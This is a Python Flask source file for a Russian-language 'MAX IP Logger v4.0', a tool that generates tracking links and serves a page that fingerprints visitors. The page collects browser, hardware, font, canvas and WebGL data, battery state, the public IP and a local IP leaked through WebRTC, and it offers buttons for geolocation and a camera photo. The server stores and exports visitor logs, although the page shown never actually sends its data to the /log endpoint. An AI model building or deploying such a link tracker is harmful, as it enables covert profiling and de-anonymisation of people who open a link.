from flask import Flask, request, redirect, render_template_string, jsonify, send_file
import uuid
import datetime
import json
import os
import base64
from io import BytesIO

app = Flask(__name__)

# Хранилище
logs_db = {}
links_db = {}

# ===================== МАКСИМАЛЬНЫЙ HTML ЛОГГЕР =====================
INDEX_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>🔥 MAX IP Logger v4.0</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body {
            background: #0b1219;
            font-family: -apple-system, 'Segoe UI', Roboto, system-ui, sans-serif;
            padding: 1rem;
            color: #e3edf5;
            min-height: 100vh;
            touch-action: manipulation;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(255,255,255,0.04);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 2rem;
            padding: 1.5rem;
            border: 1px solid rgba(255,255,255,0.06);
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        h1 {
            font-weight: 400;
            font-size: 1.8rem;
            color: #d4e6ff;
            border-bottom: 1px solid rgba(255,255,255,0.06);
            padding-bottom: 1rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            gap: 0.6rem;
            flex-wrap: wrap;
        }
        h1 small {
            font-size: 0.8rem;
            font-weight: 300;
            color: #6d8eb0;
            margin-left: auto;
        }
        .badge {
            display: inline-block;
            padding: 0.2rem 0.8rem;
            border-radius: 30px;
            font-size: 0.7rem;
            font-weight: 600;
        }
        .badge-success { background: #1d4a3b; color: #a3f0d0; }
        .badge-error { background: #5f2d3a; color: #ffb3b3; }
        .badge-pending { background: #4a4a2d; color: #f0e6a3; }

        .controls {
            display: flex;
            gap: 0.6rem;
            justify-content: center;
            flex-wrap: wrap;
            margin: 1rem 0;
        }
        .btn {
            padding: 0.6rem 1.2rem;
            border: none;
            border-radius: 50px;
            font-size: 0.85rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            font-family: inherit;
            touch-action: manipulation;
            user-select: none;
            -webkit-user-select: none;
        }
        .btn:active { transform: scale(0.95); }
        .btn-primary { background: #4a9eff; color: #fff; box-shadow: 0 4px 15px rgba(74,158,255,0.3); }
        .btn-success { background: #4aff8a; color: #0b1219; box-shadow: 0 4px 15px rgba(74,255,138,0.3); }
        .btn-danger { background: #ff4a4a; color: #fff; box-shadow: 0 4px 15px rgba(255,74,74,0.3); }
        .btn-secondary { background: #2a4058; color: #d4e6ff; border: 1px solid rgba(255,255,255,0.1); }
        .btn-gold { background: #ffd700; color: #0b1219; box-shadow: 0 4px 15px rgba(255,215,0,0.3); }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
            gap: 1rem;
        }
        .card {
            background: rgba(0,0,0,0.25);
            border-radius: 1.5rem;
            padding: 1rem 1.2rem;
            border: 1px solid rgba(255,255,255,0.04);
            transition: 0.2s;
            position: relative;
        }
        .card-title {
            font-size: 0.65rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #6d8eb0;
            margin-bottom: 0.6rem;
            border-bottom: 1px solid rgba(255,255,255,0.04);
            padding-bottom: 0.3rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .card-content {
            font-family: 'SF Mono', 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            line-height: 1.8;
            word-break: break-all;
            color: #cfe2ff;
        }
        .card-content .label {
            color: #7a9bc2;
            font-weight: 300;
            font-size: 0.65rem;
            text-transform: uppercase;
            letter-spacing: 0.3px;
            margin-right: 0.4rem;
        }
        .geo-coords {
            font-size: 1.1rem;
            font-weight: 600;
            color: #7bb3ff;
            background: rgba(0,0,0,0.3);
            padding: 0.1rem 0.8rem;
            border-radius: 40px;
            display: inline-block;
            margin-top: 0.1rem;
        }

        .camera-section {
            margin: 1rem 0;
            padding: 1rem;
            background: rgba(0,0,0,0.3);
            border-radius: 1.5rem;
            border: 2px solid #4a9eff;
            text-align: center;
        }
        .camera-section video {
            width: 100%;
            max-width: 400px;
            border-radius: 1rem;
            background: #000;
            margin: 0.5rem 0;
            transform: scaleX(-1);
        }
        .camera-section .photo-preview {
            width: 100%;
            max-width: 400px;
            border-radius: 1rem;
            margin: 0.5rem 0;
            border: 2px solid #4aff8a;
        }
        .camera-section .placeholder {
            padding: 1.5rem;
            background: rgba(0,0,0,0.5);
            border-radius: 1rem;
            color: #6d8eb0;
            margin: 0.5rem 0;
        }
        .photo-status {
            margin: 0.3rem 0;
            padding: 0.3rem 1rem;
            border-radius: 50px;
            font-size: 0.8rem;
            display: inline-block;
        }
        .photo-status.success { background: #1d4a3b; color: #a3f0d0; }
        .photo-status.error { background: #5f2d3a; color: #ffb3b3; }
        .photo-status.pending { background: #4a4a2d; color: #f0e6a3; }

        .toast {
            position: fixed;
            bottom: 1rem;
            left: 50%;
            transform: translateX(-50%);
            background: #1d4a3b;
            color: #a3f0d0;
            padding: 0.5rem 1.5rem;
            border-radius: 50px;
            font-size: 0.85rem;
            opacity: 0;
            transition: opacity 0.3s;
            pointer-events: none;
            z-index: 999;
            max-width: 90%;
            text-align: center;
        }
        .toast.show { opacity: 1; }
        .toast.error { background: #5f2d3a; color: #ffb3b3; }

        .footer {
            margin-top: 2rem;
            font-size: 0.7rem;
            color: #4a6a89;
            text-align: center;
            border-top: 1px solid rgba(255,255,255,0.04);
            padding-top: 1rem;
        }

        /* Мобильные улучшения */
        @media (max-width: 600px) {
            .container { padding: 1rem; border-radius: 1rem; }
            h1 { font-size: 1.4rem; }
            .grid { grid-template-columns: 1fr; }
            .btn { padding: 0.5rem 1rem; font-size: 0.8rem; }
            .controls { gap: 0.4rem; }
            .card { padding: 0.8rem 1rem; }
        }
        @media (max-width: 400px) {
            .btn { padding: 0.4rem 0.8rem; font-size: 0.7rem; }
            .card-content { font-size: 0.7rem; }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>
        🔥 MAX IP Logger v4.0
        <small id="timestamp"></small>
        <span id="statusBadge" class="badge badge-pending">⏳ загрузка</span>
    </h1>

    <div class="controls">
        <button class="btn btn-primary" id="refreshBtn">🔄 Обновить</button>
        <button class="btn btn-gold" id="exportBtn">📥 JSON</button>
        <button class="btn btn-secondary" id="copyBtn">📋 Копировать</button>
    </div>
    <div class="controls">
        <button class="btn btn-primary" id="requestGeoBtn">📍 Геолокация</button>
        <button class="btn btn-success" id="requestCameraBtn">📷 Камера</button>
        <button class="btn btn-danger" id="resetBtn">🗑️ Сброс</button>
    </div>

    <div class="camera-section" id="cameraSection">
        <h3 style="color: #d4e6ff; margin-bottom: 0.3rem;">📸 Фото</h3>
        <div id="cameraPlaceholder" class="placeholder">⏳ Камера не активна<br><span style="font-size:0.7rem;color:#4a6a89;">Нажмите «Камера»</span></div>
        <video id="video" autoplay playsinline style="display: none;"></video>
        <canvas id="canvas" style="display: none;"></canvas>
        <img id="photoPreview" class="photo-preview" style="display: none;" alt="Ваше фото" />
        <div style="display:flex;gap:0.5rem;justify-content:center;flex-wrap:wrap;margin:0.3rem 0;">
            <button class="btn btn-success" id="takePhotoBtn" style="display:none;">📸 Сделать</button>
            <button class="btn btn-danger" id="stopCameraBtn" style="display:none;">⏹️ Стоп</button>
            <button class="btn btn-secondary" id="clearPhotoBtn">🗑️ Удалить</button>
        </div>
        <div id="photoStatus" style="display:none;">
            <span class="photo-status pending">⏳ Ожидание...</span>
        </div>
    </div>

    <div class="grid" id="info-grid"></div>

    <div class="footer">
        ⚡ Собрано из доступных API · <span id="api-status">загрузка...</span>
        <br><span style="font-size:0.6rem;opacity:0.6;">📍 Гео · 📷 Камера · 🔋 Батарея</span>
    </div>
</div>

<div class="toast" id="toast"></div>

<script>
(function() {
    // ========== ДАННЫЕ ==========
    const info = {};

    // ========== DOM ==========
    const grid = document.getElementById('info-grid');
    const apiStatus = document.getElementById('api-status');
    const timestamp = document.getElementById('timestamp');
    const statusBadge = document.getElementById('statusBadge');
    const toast = document.getElementById('toast');

    function showToast(text, isError = false) {
        toast.textContent = text;
        toast.className = 'toast show' + (isError ? ' error' : '');
        clearTimeout(toast._hide);
        toast._hide = setTimeout(() => toast.classList.remove('show'), 3000);
    }

    // ========== ЭКСПОРТ ==========
    function exportJSON() {
        const data = { collected_at: new Date().toISOString(), user_agent: navigator.userAgent, data: info };
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `fingerprint_${Date.now()}.json`;
        a.click();
        URL.revokeObjectURL(url);
        showToast('📥 JSON экспортирован!');
    }

    // ========== КОПИРОВАНИЕ ==========
    function copyAllData() {
        const text = JSON.stringify(info, null, 2);
        navigator.clipboard.writeText(text).then(() => {
            showToast('📋 Данные скопированы!');
        }).catch(() => {
            const area = document.createElement('textarea');
            area.value = text;
            document.body.appendChild(area);
            area.select();
            document.execCommand('copy');
            document.body.removeChild(area);
            showToast('📋 Данные скопированы!');
        });
    }

    // ========== ГЕОЛОКАЦИЯ ==========
    let geoCoords = null;
    let geoError = null;

    function requestGeolocation() {
        if (!navigator.geolocation) {
            geoError = 'Geolocation не поддерживается';
            info.geo = { '📌 Статус': '🚫 НЕ ПОДДЕРЖИВАЕТСЯ' };
            renderAll();
            return;
        }
        info.geo = { '📌 Статус': '⏳ ЗАГРУЗКА...' };
        renderAll();

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                geoCoords = { lat: latitude, lng: longitude, accuracy: accuracy };
                geoError = null;
                info.geo = {
                    '📌 Статус': '✅ РАЗРЕШЕНО',
                    '📍 Координаты': `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`,
                    '🎯 Точность': `${Math.round(accuracy)} м`,
                };
                renderAll();
                showToast('📍 Геолокация получена!');
            },
            (err) => {
                let msg = err.message;
                if (err.code === 1) msg = 'Пользователь отклонил запрос';
                else if (err.code === 2) msg = 'Позиция недоступна';
                else if (err.code === 3) msg = 'Таймаут запроса';
                geoError = msg;
                info.geo = {
                    '📌 Статус': '❌ ОТКАЗАНО',
                    '📍 Координаты': '🔴 недоступны',
                    '🎯 Точность': '—',
                };
                renderAll();
                showToast('❌ ' + msg, true);
            },
            { enableHighAccuracy: true, timeout: 15000 }
        );
    }

    // ========== КАМЕРА ==========
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const photoPreview = document.getElementById('photoPreview');
    const placeholder = document.getElementById('cameraPlaceholder');
    const photoStatus = document.getElementById('photoStatus');
    const statusSpan = photoStatus.querySelector('.photo-status');
    const startCameraBtn = document.getElementById('requestCameraBtn');
    const takePhotoBtn = document.getElementById('takePhotoBtn');
    const stopCameraBtn = document.getElementById('stopCameraBtn');
    const clearPhotoBtn = document.getElementById('clearPhotoBtn');

    let stream = null;
    let cameraActive = false;

    function setPhotoStatus(text, type = 'pending') {
        photoStatus.style.display = 'block';
        statusSpan.textContent = text;
        statusSpan.className = 'photo-status ' + type;
    }

    function startCamera() {
        if (cameraActive) return;
        setPhotoStatus('⏳ Запрос...', 'pending');

        navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        })
        .then(function(mediaStream) {
            stream = mediaStream;
            video.srcObject = stream;
            video.style.display = 'block';
            placeholder.style.display = 'none';
            cameraActive = true;
            takePhotoBtn.style.display = 'inline-block';
            stopCameraBtn.style.display = 'inline-block';
            setPhotoStatus('✅ Камера активна', 'success');
            showToast('📷 Камера запущена');
        })
        .catch(function(err) {
            let msg = err.message;
            if (err.name === 'NotAllowedError') msg = 'Пользователь отклонил доступ';
            else if (err.name === 'NotFoundError') msg = 'Камера не найдена';
            else if (err.name === 'NotReadableError') msg = 'Камера занята';
            setPhotoStatus('❌ ' + msg, 'error');
            showToast('❌ ' + msg, true);
        });
    }

    function takePhoto() {
        if (!cameraActive || !stream) return;
        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        ctx.setTransform(1, 0, 0, 1, 0, 0);

        const photoDataURL = canvas.toDataURL('image/jpeg', 0.95);
        photoPreview.src = photoDataURL;
        photoPreview.style.display = 'block';

        info.photo = {
            '📸 Фото': '✅ да',
            '📏 Размер': `${canvas.width}×${canvas.height} px`,
            '📦 Вес': `${Math.round(photoDataURL.length / 1024)} KB`,
            '🕒 Время': new Date().toLocaleString('ru-RU'),
        };
        setPhotoStatus('✅ Фото сделано!', 'success');
        showToast('📸 Фото сделано!');
        renderAll();
    }

    function stopCamera() {
        if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
        video.srcObject = null;
        video.style.display = 'none';
        cameraActive = false;
        takePhotoBtn.style.display = 'none';
        stopCameraBtn.style.display = 'none';
        setPhotoStatus('⏹️ Камера остановлена', 'pending');
    }

    function clearPhoto() {
        photoPreview.style.display = 'none';
        photoPreview.src = '';
        if (info.photo) delete info.photo;
        renderAll();
        setPhotoStatus('🗑️ Фото удалено', 'pending');
    }

    // ========== СБОР ВСЕХ ДАННЫХ ==========
    function collectAllData() {
        // ===== БРАУЗЕР =====
        info.browser = {
            'User-Agent': navigator.userAgent,
            'Платформа': navigator.platform || '—',
            'Язык': navigator.language,
            'Языки': navigator.languages ? navigator.languages.join(', ') : '—',
            'Do Not Track': navigator.doNotTrack || 'не отправлен',
            'Cookies': navigator.cookieEnabled ? '✅ да' : '❌ нет',
            'WebDriver': navigator.webdriver ? '✅ да' : '❌ нет',
        };

        // ===== ЭКРАН =====
        info.screen = {
            'Размер экрана': `${screen.width}×${screen.height}`,
            'Пиксельная плотность': `${window.devicePixelRatio || 1}x`,
            'Размер окна': `${window.innerWidth}×${window.innerHeight}`,
            'Ориентация': screen.orientation?.type || '—',
        };

        // ===== ВРЕМЯ =====
        const tz = Intl.DateTimeFormat().resolvedOptions();
        info.time = {
            'Часовой пояс': tz.timeZone || '—',
            'Смещение UTC': `UTC${new Date().getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(new Date().getTimezoneOffset() / 60)}`,
            'Локальное время': new Date().toLocaleString('ru-RU', { hour12: false }),
            'Unix timestamp': Math.floor(Date.now() / 1000),
        };

        // ===== ЖЕЛЕЗО =====
        info.hardware = {
            'Ядра CPU': navigator.hardwareConcurrency || '—',
            'Память': navigator.deviceMemory ? `${navigator.deviceMemory} ГБ` : '—',
            'Тип сети': navigator.connection?.effectiveType || '—',
            'Скорость': navigator.connection?.downlink ? `${navigator.connection.downlink} Мбит/с` : '—',
            'Состояние сети': navigator.onLine ? '✅ онлайн' : '❌ офлайн',
        };

        // ===== ГЕОЛОКАЦИЯ =====
        if (geoCoords) {
            info.geo = {
                '📌 Статус': '✅ РАЗРЕШЕНО',
                '📍 Координаты': `${geoCoords.lat.toFixed(6)}, ${geoCoords.lng.toFixed(6)}`,
                '🎯 Точность': `${Math.round(geoCoords.accuracy)} м`,
            };
        } else if (geoError) {
            info.geo = {
                '📌 Статус': '❌ ОТКАЗАНО',
                '📍 Координаты': '🔴 недоступны',
                '🎯 Точность': '—',
            };
        } else {
            info.geo = {
                '📌 Статус': '⏳ нажмите кнопку',
                '📍 Координаты': '🔴 не определены',
                '🎯 Точность': '—',
            };
        }

        // ===== МЕДИАУСТРОЙСТВА =====
        info.media = {
            'Аудио-вход': '⏳ ...',
            'Видео-вход': '⏳ ...',
            'Аудио-выход': '⏳ ...',
        };
        if (navigator.mediaDevices?.enumerateDevices) {
            navigator.mediaDevices.enumerateDevices()
                .then(devices => {
                    info.media['Аудио-вход'] = devices.filter(d => d.kind === 'audioinput').length + ' шт.';
                    info.media['Видео-вход'] = devices.filter(d => d.kind === 'videoinput').length + ' шт.';
                    info.media['Аудио-выход'] = devices.filter(d => d.kind === 'audiooutput').length + ' шт.';
                    renderAll();
                })
                .catch(() => {
                    info.media['Аудио-вход'] = '❌ ошибка';
                    info.media['Видео-вход'] = '❌ ошибка';
                    info.media['Аудио-выход'] = '❌ ошибка';
                    renderAll();
                });
        }

        // ===== БАТАРЕЯ =====
        info.battery = { 'Заряд': '⏳ ...', 'Зарядка': '⏳ ...' };
        if (navigator.getBattery) {
            const timeout = setTimeout(() => {
                info.battery['Заряд'] = '⏱️ таймаут';
                info.battery['Зарядка'] = '⏱️ таймаут';
                renderAll();
            }, 3200);
            navigator.getBattery()
                .then(bat => {
                    clearTimeout(timeout);
                    info.battery['Заряд'] = `${Math.round(bat.level * 100)}%`;
                    info.battery['Зарядка'] = bat.charging ? '🔌 да' : '🔋 нет';
                    renderAll();
                })
                .catch(() => {
                    clearTimeout(timeout);
                    info.battery['Заряд'] = '❌ ошибка';
                    info.battery['Зарядка'] = '❌ ошибка';
                    renderAll();
                });
        }

        // ===== ШРИФТЫ =====
        info.fonts = { 'Обнаружено': '⏳ ...', 'Список': '⏳ ...' };
        try {
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            const testText = 'abcdefghijklmnopqrstuvwxyz';
            const baseFont = 'monospace';
            const fontList = ['Arial','Verdana','Helvetica','Times New Roman','Courier New','Georgia','Trebuchet MS','Tahoma','Impact','Comic Sans MS'];
            let detected = [];
            for (const f of fontList) {
                ctx.font = `14px "${f}", ${baseFont}`;
                const w1 = ctx.measureText(testText).width;
                ctx.font = `14px ${baseFont}`;
                const w2 = ctx.measureText(testText).width;
                if (w1 !== w2) detected.push(f);
            }
            info.fonts['Обнаружено'] = detected.length + ' шт.';
            info.fonts['Список'] = detected.length ? detected.join(', ') : 'нет';
        } catch (e) {}

        // ===== ПУБЛИЧНЫЙ IP =====
        info.publicIP = { 'IPv4': '⏳ ...', 'Источник': '⏳ ...' };
        (async function fetchIP() {
            try {
                const resp = await fetch('https://api.ipify.org?format=json', { cache: 'no-cache', signal: AbortSignal.timeout(2000) });
                const data = await resp.json();
                info.publicIP['IPv4'] = data.ip || '❌';
                info.publicIP['Источник'] = 'ipify.org';
            } catch (e) {
                info.publicIP['IPv4'] = '❌ недоступен';
                info.publicIP['Источник'] = '—';
            }
            renderAll();
        })();

        // ===== ЛОКАЛЬНЫЙ IP =====
        info.webrtc = { 'Локальный IP': '⏳ ...' };
        try {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('test');
            pc.createOffer().then(o => pc.setLocalDescription(o));
            const ips = new Set();
            pc.onicecandidate = (e) => {
                if (e.candidate && e.candidate.candidate) {
                    const match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                    if (match && !match[1].startsWith('127.')) ips.add(match[1]);
                }
            };
            setTimeout(() => {
                info.webrtc['Локальный IP'] = ips.size ? Array.from(ips).join(', ') : '⏱️ таймаут';
                renderAll();
                pc.close();
            }, 3200);
        } catch (e) {
            info.webrtc['Локальный IP'] = '❌ не поддерживается';
            renderAll();
        }

        // ===== WebGL =====
        info.webgl = { 'Рендерер': '⏳ ...', 'Версия': '⏳ ...' };
        try {
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
            if (gl) {
                info.webgl['Рендерер'] = gl.getParameter(gl.RENDERER) || '—';
                info.webgl['Версия'] = gl.getParameter(gl.VERSION) || '—';
            } else {
                info.webgl['Рендерер'] = '🚫 не поддерживается';
                info.webgl['Версия'] = '—';
            }
        } catch (e) {
            info.webgl['Рендерер'] = '❌ ошибка';
            info.webgl['Версия'] = '❌ ошибка';
        }

        // ===== ХРАНИЛИЩА =====
        info.storage = {
            'LocalStorage': (typeof localStorage !== 'undefined') ? '✅ доступен' : '❌ нет',
            'SessionStorage': (typeof sessionStorage !== 'undefined') ? '✅ доступен' : '❌ нет',
            'IndexedDB': 'indexedDB' in window ? '✅ доступен' : '❌ нет',
        };

        // ===== CANVAS ОТПЕЧАТОК =====
        info.canvas = { 'Отпечаток': '⏳ ...' };
        try {
            const c = document.createElement('canvas');
            c.width = 256; c.height = 128;
            const ctx = c.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 16, 16);
            ctx.fillStyle = '#069';
            ctx.fillText('Canvas Fingerprint', 2, 15);
            const fp = c.toDataURL();
            info.canvas['Отпечаток'] = fp.substring(0, 60) + '...';
        } catch (e) {
            info.canvas['Отпечаток'] = '❌ ошибка';
        }

        // ===== ДОПОЛНИТЕЛЬНО =====
        info.extra = {
            'Время загрузки': '⏳ ...',
            'Элементов': document.querySelectorAll('*').length + ' шт.',
        };
        if (performance && performance.timing) {
            const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
            info.extra['Время загрузки'] = loadTime > 0 ? `${loadTime} мс` : '—';
        }

        // ===== УСТРОЙСТВО =====
        const ua = navigator.userAgent;
        info.device = {
            'Мобильное': /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? '✅ да' : '❌ нет',
            'Тип': /iPad/i.test(ua) ? 'Планшет' : /Mobi|Android|iPhone|iPod/i.test(ua) ? 'Телефон' : 'Десктоп',
            'ОС': ua.match(/Android|iPhone|iPad|Windows|Mac|Linux/)?.[0] || '—',
        };

        // ===== ПЛАГИНЫ =====
        info.plugins = {
            'Количество': navigator.plugins ? navigator.plugins.length : '—',
            'Список': navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') : '—',
        };

        // ===== ADBLOCK =====
        info.adblock = { 'AdBlock': '⏳ ...' };
        try {
            const testAd = document.createElement('div');
            testAd.className = 'adsbox';
            testAd.style.display = 'block';
            testAd.style.height = '1px';
            document.body.appendChild(testAd);
            info.adblock['AdBlock'] = testAd.offsetHeight === 0 ? '✅ да' : '❌ нет';
            document.body.removeChild(testAd);
        } catch (e) { info.adblock['AdBlock'] = '❌ ошибка'; }

        statusBadge.className = 'badge badge-success';
        statusBadge.textContent = '✅ готово';
        apiStatus.textContent = '✅ данные собраны';
        timestamp.textContent = new Date().toLocaleTimeString('ru-RU');
        renderAll();
    }

    // ========== ОТРИСОВКА ==========
    function renderAll() {
        const sections = [
            { title: '🌐 Браузер', data: info.browser },
            { title: '🖥️ Экран', data: info.screen },
            { title: '⏰ Время', data: info.time },
            { title: '⚙️ Железо', data: info.hardware },
            { title: '📍 ГЕО', data: info.geo },
            { title: '🎤 Медиа', data: info.media },
            { title: '🔋 Батарея', data: info.battery },
            { title: '🔤 Шрифты', data: info.fonts },
            { title: '🌍 Публичный IP', data: info.publicIP },
            { title: '🔗 Локальный IP', data: info.webrtc },
            { title: '🎮 WebGL', data: info.webgl },
            { title: '💾 Хранилища', data: info.storage },
            { title: '🎨 Canvas', data: info.canvas },
            { title: '📊 Доп.', data: info.extra },
            { title: '📱 Устройство', data: info.device },
            { title: '🔌 Плагины', data: info.plugins },
            { title: '🛡️ AdBlock', data: info.adblock },
        ];
        if (info.photo) sections.push({ title: '📸 ФОТО', data: info.photo });

        let html = '';
        for (const sec of sections) {
            const isGeo = sec.title.includes('ГЕО');
            const isPhoto = sec.title.includes('ФОТО');
            const border = isGeo ? 'border:2px solid #4a9eff;' : (isPhoto ? 'border:2px solid #4aff8a;' : '');
            html += `<div class="card" style="${border}">
                <div class="card-title">${sec.title}</div>
                <div class="card-content">`;
            for (const [key, val] of Object.entries(sec.data)) {
                const v = (val === undefined || val === null) ? '—' : String(val);
                if (isGeo && key === '📍 Координаты' && !v.includes('не определены') && !v.includes('недоступны')) {
                    html += `<div><span class="label">${key}</span> <span class="geo-coords">${v}</span></div>`;
                } else {
                    html += `<div><span class="label">${key}</span> ${v}</div>`;
                }
            }
            html += `</div></div>`;
        }
        grid.innerHTML = html;
    }

    // ========== КНОПКИ ==========
    document.getElementById('requestGeoBtn').addEventListener('click', requestGeolocation);
    document.getElementById('refreshBtn').addEventListener('click', () => location.reload());
    document.getElementById('exportBtn').addEventListener('click', exportJSON);
    document.getElementById('copyBtn').addEventListener('click', copyAllData);
    startCameraBtn.addEventListener('click', startCamera);
    takePhotoBtn.addEventListener('click', takePhoto);
    stopCameraBtn.addEventListener('click', stopCamera);
    clearPhotoBtn.addEventListener('click', clearPhoto);

    document.getElementById('resetBtn').addEventListener('click', function() {
        geoCoords = null;
        geoError = null;
        if (info.photo) delete info.photo;
        clearPhoto();
        stopCamera();
        Object.keys(info).forEach(key => { if (key !== 'geo') delete info[key]; });
        statusBadge.className = 'badge badge-pending';
        statusBadge.textContent = '⏳ загрузка';
        collectAllData();
        showToast('🔄 Сброшено');
    });

    // ========== ЗАПУСК ==========
    collectAllData();
    console.log('🚀 MAX IP Logger v4.0 загружен');
})();
</script>
</body>
</html>
"""

# ===================== МАРШРУТЫ =====================
@app.route('/')
def index():
    return render_template_string(INDEX_HTML)

@app.route('/generate')
def generate_link():
    link_id = str(uuid.uuid4())[:8]
    links_db[link_id] = {'created': datetime.datetime.now().isoformat()}
    logs_db[link_id] = []
    return jsonify({
        'id': link_id,
        'full_url': f"{request.host_url}l/{link_id}",
        'visits': 0,
        'unique': 0,
        'last_visit': '-'
    })

@app.route('/l/<link_id>')
def serve_logger(link_id):
    if link_id not in links_db:
        return 'Ссылка не найдена', 404
    return render_template_string(INDEX_HTML)

@app.route('/log', methods=['POST'])
def log_data():
    data = request.get_json()
    link_id = data.get('link_id')
    if link_id not in logs_db:
        logs_db[link_id] = []
    logs_db[link_id].append(data)
    return jsonify({'status': 'ok'})

@app.route('/stats/<link_id>')
def get_stats(link_id):
    return jsonify({'visitors': logs_db.get(link_id, []), 'total': len(logs_db.get(link_id, []))})

@app.route('/clear/<link_id>', methods=['POST'])
def clear_stats(link_id):
    if link_id in logs_db:
        logs_db[link_id] = []
    return jsonify({'status': 'ok'})

@app.route('/export/<link_id>')
def export_stats(link_id):
    return jsonify(logs_db.get(link_id, []))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
